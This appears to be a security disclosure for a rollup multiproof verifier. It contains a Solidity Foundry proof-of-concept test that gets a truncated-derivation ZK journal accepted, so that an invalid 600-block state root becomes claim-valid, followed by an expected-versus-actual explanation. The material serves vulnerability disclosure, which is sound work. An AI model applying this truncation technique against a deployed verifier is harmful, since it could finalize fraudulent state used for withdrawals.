import { IAnchorStateRegistry } from "interfaces/dispute/IAnchorStateRegistry.sol";
import { IDelayedWETH } from "interfaces/dispute/IDelayedWETH.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { Claim, GameStatus, Proposal } from "src/dispute/lib/Types.sol";
import { AggregateVerifier } from "src/multiproof/AggregateVerifier.sol";
import { Verifier } from "src/multiproof/Verifier.sol";
import { BaseTest } from "./BaseTest.t.sol";

contract EndOfSourceJournalVerifier is Verifier {
    bytes32 public expectedJournal;

    constructor(IAnchorStateRegistry anchorStateRegistry) Verifier(anchorStateRegistry) { }

    function setExpectedJournal(bytes32 journal) external {
        expectedJournal = journal;
    }

    function verify(bytes calldata, bytes32, bytes32 journal) external view override notNullified returns (bool) {
        return journal == expectedJournal;
    }
}

contract AuditZkEndOfSourceTruncationTest is BaseTest {
    uint256 internal constant SEPOLIA_BLOCK_INTERVAL = 600;
    uint256 internal constant SEPOLIA_INTERMEDIATE_BLOCK_INTERVAL = 30;

    EndOfSourceJournalVerifier internal strictZkVerifier;

    function setUp() public override {
        super.setUp();

        strictZkVerifier = new EndOfSourceJournalVerifier(IAnchorStateRegistry(address(anchorStateRegistry)));

        AggregateVerifier sepoliaLikeImpl = new AggregateVerifier(
            AGGREGATE_VERIFIER_GAME_TYPE,
            IAnchorStateRegistry(address(anchorStateRegistry)),
            IDelayedWETH(payable(address(delayedWETH))),
            teeVerifier,
            strictZkVerifier,
            TEE_IMAGE_HASH,
            AggregateVerifier.ZkHashes(ZK_RANGE_HASH, ZK_AGGREGATE_HASH),
            CONFIG_HASH,
            L2_CHAIN_ID,
            SEPOLIA_BLOCK_INTERVAL,
            SEPOLIA_INTERMEDIATE_BLOCK_INTERVAL,
            1
        );

        factory.setImplementation(AGGREGATE_VERIFIER_GAME_TYPE, IDisputeGame(address(sepoliaLikeImpl)));
    }

    function testTruncatedTwentyBlockZkJournalCreatesClaimValidSixHundredBlockGame() public {
        Proposal memory startingAnchor = anchorStateRegistry.getStartingAnchorRoot();
        uint256 claimedL2BlockNumber = startingAnchor.l2SequenceNumber + SEPOLIA_BLOCK_INTERVAL;

        bytes32[] memory oneBlockRoots = new bytes32[](SEPOLIA_BLOCK_INTERVAL / SEPOLIA_INTERMEDIATE_BLOCK_INTERVAL);
        for (uint256 i = 0; i < oneBlockRoots.length; i++) {
            oneBlockRoots[i] = keccak256(abi.encode("actual one-block root", startingAnchor.l2SequenceNumber + i + 1));
        }

        bytes memory intermediateRoots = _packRoots(oneBlockRoots);
        Claim rootClaim = Claim.wrap(oneBlockRoots[oneBlockRoots.length - 1]);
        bytes memory extraData = abi.encodePacked(uint256(claimedL2BlockNumber), address(anchorStateRegistry), intermediateRoots);

        bytes32 l1OriginHash = blockhash(block.number - 1);
        uint256 l1OriginNumber = block.number - 1;

        bytes32 expectedJournal = keccak256(
            abi.encodePacked(
                ZK_PROVER,
                l1OriginHash,
                startingAnchor.root.raw(),
                uint64(startingAnchor.l2SequenceNumber),
                rootClaim.raw(),
                uint64(claimedL2BlockNumber),
                intermediateRoots,
                CONFIG_HASH,
                ZK_RANGE_HASH
            )
        );
        strictZkVerifier.setExpectedJournal(expectedJournal);

        bytes memory proof = abi.encodePacked(
            uint8(AggregateVerifier.ProofType.ZK),
            l1OriginHash,
            l1OriginNumber,
            bytes("zk proof whose public values came from truncated derivation")
        );

        vm.deal(ZK_PROVER, INIT_BOND);
        vm.prank(ZK_PROVER);
        AggregateVerifier game = AggregateVerifier(
            address(factory.createWithInitData{ value: INIT_BOND }(AGGREGATE_VERIFIER_GAME_TYPE, rootClaim, extraData, proof))
        );

        assertEq(game.l2SequenceNumber(), claimedL2BlockNumber);
        assertEq(game.rootClaim().raw(), oneBlockRoots[oneBlockRoots.length - 1]);
        assertEq(game.intermediateOutputRoots(), intermediateRoots);

        vm.warp(block.timestamp + game.SLOW_FINALIZATION_DELAY() + 1);
        game.resolve();

        assertEq(uint8(game.status()), uint8(GameStatus.DEFENDER_WINS));

        vm.warp(block.timestamp + 1);
        assertTrue(anchorStateRegistry.isGameClaimValid(IDisputeGame(address(game))));
    }

    function _packRoots(bytes32[] memory roots) internal pure returns (bytes memory packed) {
        for (uint256 i = 0; i < roots.length; i++) {
            packed = abi.encodePacked(packed, roots[i]);
        }
    }
}
```

</details>

This PoC is intentionally not a theft PoC. It proves the in-scope verifier impact: the invalid state root becomes claim-valid through the same `AggregateVerifier` lifecycle used by withdrawals.

## Expected vs Actual

Expected:

After Azul/Isthmus, a ZK proof for a requested target block must fail if the derivation pipeline cannot reach that target. The proof must bind the actual derived safe-head block number, the requested ending L2 block number, and the interval/count of intermediate roots.

Actual:

The range client accepts `EndOfSource`, lowers the internal target to the current safe head, and returns success. Public values still commit the originally requested target block number. By choosing `intermediate_root_interval = 1`, a prover can provide the same number of intermediate roots that `AggregateVerifier` expects for 30-block spacing, while those roots actually correspond to one-block spacing.
